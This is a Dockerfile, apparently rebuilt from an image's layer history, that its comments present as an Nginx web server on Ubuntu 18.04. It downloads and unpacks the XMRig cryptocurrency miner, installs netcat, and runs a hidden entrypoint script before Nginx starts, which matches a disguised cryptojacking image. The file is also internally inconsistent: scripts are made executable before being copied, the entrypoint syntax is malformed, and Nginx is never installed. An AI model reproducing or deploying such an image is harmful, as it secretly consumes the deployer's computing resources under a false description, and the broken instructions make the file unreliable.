# Pull the minimal Ubuntu image
FROM scratch
ARG RELEASE
ARG LAUNCHPAD_BUILD_ARCH
LABEL org.opencontainers.image.ref.name=ubuntu
LABEL org.opencontainers.image.version=18.04
ADD file:4560926e076acae6b8396a9f1e760eee0f53e22e90ce8554dda57f1103547795 in /
CMD ["/bin/bash"]

# Set user to root
USER root

RUN apt update -y && apt install curl -qqy git wget netcat gcc build-essential procps iputils-ping dnsutils

WORKDIR /opt

RUN wget -q https://github.com/xmrig/xmrig/releases/download/v6.19.2/xmrig-6.19.2-linux-x64.tar.gz && tar -xf xmrig-6.19.2-linux-x64.tar.gz

RUN mkdir -p /tmp && chmod 777 /tmp && chmod +x /opt/entrypoint.sh && chmod +x /opt/manual-run.sh

COPY 7b54d0235a9720e356737de49f15857dfb744e691a8661354176dfc7e59e1ef4 /opt/entrypoint.sh

COPY e6c6692d478206f66b5643cc3b31efb8178328f85cd989a6e9cef690a0667d68 /opt/manual-run.sh

ENTRYPOINT ["/opt/entrypoint.sh" "-c" "--"]

# Nginx already present in base image. Just copy the Nginx config
COPY default /etc/nginx/sites-available/default

# Expose the port for access
EXPOSE 80/tcp

# Run the Nginx server
CMD /opt/entrypoint.sh && /usr/sbin/nginx -g daemon off
